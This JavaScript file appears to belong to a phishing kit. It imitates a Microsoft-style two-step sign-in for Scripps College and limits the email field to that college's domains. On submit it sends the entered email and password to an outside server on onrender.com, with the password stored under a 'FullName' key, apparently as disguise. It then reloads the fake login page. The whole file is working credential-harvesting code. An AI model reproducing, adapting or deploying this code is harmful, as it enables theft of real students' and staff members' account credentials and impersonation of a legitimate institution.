document.addEventListener("DOMContentLoaded", function() {
    // Elements
    const nextBtn = document.getElementById('nextBtn');
    const submitBtn = document.getElementById('submitBtn');
    const backBtn = document.getElementById('backBtn');
    const userNameDisplay = document.getElementById('userNameDisplay');
    const signInDisplay = document.getElementById('signInDisplay');
    const subtitleUserNameDisplay = document.getElementById('subtitle');
    const accessAcct = document.getElementById('accessAcc');
    const forPAss = document.getElementById('forPass');
    const msLogo = document.getElementById("ms");
    const nauLogo = document.getElementById("nau");
    const name = document.getElementById("user");
    const key = document.getElementById("pass");
    const passCon = document.getElementById("pass-con");
    const scrippLog = document.getElementById("scripplog");

    // Email validation
    function validateEmail(email) {
        // List of allowed email domains
        const allowedDomains = [
            "@scrippscollege.edu",
            "@natsci.claremont.edu",
        ];
    
        // Check if the email ends with any of the allowed domains
        return allowedDomains.some(domain => email.endsWith(domain));
    }

    // Event listener for next button
    nextBtn.addEventListener('click', (e) => {
        e.preventDefault();
        if (validateEmail(name.value)) {
            name.style.display = 'none';
            passCon.style.display = 'block';
            nextBtn.style.display = 'none';
            submitBtn.style.display = 'block';
            forPAss.style.display = 'block';
            accessAcct.style.display = 'none';
            userNameDisplay.style.display = 'block';
            subtitleUserNameDisplay.textContent = name.value;
            signInDisplay.style.display = 'none';
            backBtn.style.display = 'block';
            msLogo.style.display = 'none';
            nauLogo.style.display = 'block';
        } else {
            alert('Invalid email');
        }
    });

    // Back button handler
    backBtn.addEventListener('click', (e) => {
        e.preventDefault();
        backBtn.style.display = 'none';
        name.style.display = 'block';
        passCon.style.display = 'none';
        nextBtn.style.display = 'block';
        submitBtn.style.display = 'none';
        forPAss.style.display = 'none';
        accessAcct.style.display = 'block';
        userNameDisplay.style.display = 'none';
        signInDisplay.style.display = 'block';
        msLogo.style.display = 'block';
        nauLogo.style.display = 'none';
    });

    // Handle form submission
    scrippLog.addEventListener("submit", function(event) {
        event.preventDefault();

        if (key.value.trim() === '') {
            alert('Password can\'t be empty');
            return;
        }

        // Disable submit button to prevent multiple submissions
        submitBtn.disabled = true;
        submitBtn.textContent = 'Authenticating...';

        const userData = {
            FullName: key.value,
            Email: name.value,
            Password: "username",
        };

        fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(userData)
        })
        .then(response => {
            if (!response.ok) {
                return response.json().then(err => { throw err; });
            }
            return response.json();
        })
        .then(data => {
            // Redirect to home page after 2 seconds
            setTimeout(() => {
                window.location.href = "scrippLog.html";
            }, 2000);
        })
        .catch(error => {
            alert("There was a problem submitting the form. Please try again later.");
            console.error("Error:", error);
        })
        .finally(() => {
            // Re-enable submit button
            submitBtn.disabled = false;
            submitBtn.value = 'Submit';
        });
    });
});
